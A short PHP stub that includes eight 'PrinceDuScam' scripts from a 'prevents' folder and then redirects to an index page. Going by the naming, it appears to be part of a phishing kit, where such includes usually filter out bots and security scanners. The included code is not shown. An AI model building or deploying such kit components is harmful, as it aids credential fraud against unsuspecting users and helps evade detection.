<?php
  	include '../../prevents/PrinceDuScam1.php';
    include '../../prevents/PrinceDuScam2.php';
    include '../../prevents/PrinceDuScam3.php';
    include '../../prevents/PrinceDuScam4.php';
    include '../../prevents/PrinceDuScam5.php';
    include '../../prevents/PrinceDuScam6.php';
    include '../../prevents/PrinceDuScam7.php';
    include '../../prevents/PrinceDuScam8.php';
	exit(header("Location: ../index.php"));
?>
